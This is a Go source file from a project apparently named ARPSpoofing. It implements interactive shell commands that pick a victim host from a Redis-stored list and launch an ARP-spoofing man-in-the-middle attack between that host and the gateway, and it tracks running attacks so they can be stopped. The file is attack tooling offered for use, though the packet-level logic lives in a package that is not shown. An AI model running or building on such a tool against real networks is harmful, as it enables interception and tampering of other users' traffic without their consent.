package controllers

import (
	"ARPSpoofing/dao/redis"
	"ARPSpoofing/logic"
	"ARPSpoofing/settings"
	"ARPSpoofing/vars"
	"context"
	"fmt"
	"log"

	"github.com/abiosoft/ishell"
)

//MiddleAttackHandler 中间人攻击
func MiddleAttackHandler(c *ishell.Context) {
	//1.接收参数
	gateway, err := settings.Options.Get("gateway")
	if err != nil {
		c.Println("请先设定网关 set gateway value")
		return
	}
	//2.选择目标主机
	ipList, err := redis.NewHosts().GetAllIP()
	if err != nil {
		c.Println("redis get ip list failed,err:", err)
		return
	}
	noAttackedList := make([]string, 0, len(ipList))
	for i := range ipList {
		if ipList[i] == gateway {
			continue
		}
		if _, exist := vars.MiddleAttackCancelMap[ipList[i]]; true == exist {
			continue
		}
		noAttackedList = append(noAttackedList, ipList[i])
	}
	if len(noAttackedList) == 0 {
		fmt.Println("暂时没有可以攻击的主机")
		return
	}
	targetIndex := c.MultiChoice(noAttackedList, "which host do you want to attack?")
	fmt.Printf("\r成为%s 和%s之间的中间人\n", gateway, noAttackedList[targetIndex])
	ctx, cancel := context.WithCancel(context.Background())
	if err := logic.MiddleAttack(ctx, gateway, noAttackedList[targetIndex], gateway); err != nil {
		log.Println("logic.MiddleAttack failed,err:", err)
		return
	}
	//3.维护一个中间人攻击和退出函数的映射
	vars.MiddleAttackCancelMap[noAttackedList[targetIndex]] = cancel
}

//StopMiddleAttackHandler 停止中间人攻击
func StopMiddleAttackHandler(c *ishell.Context) {
	hosts := make([]string, 0)
	for key := range vars.MiddleAttackCancelMap {
		hosts = append(hosts, key)
	}
	if len(hosts) == 0 {
		c.Println("暂时没有正在受攻击的主机")
		return
	}
	choice := c.MultiChoice(hosts, "Please select host.")
	c.Println("Stop attacking:", hosts[choice])
	vars.MiddleAttackCancelMap[hosts[choice]]()
	delete(vars.MiddleAttackCancelMap, hosts[choice])
}
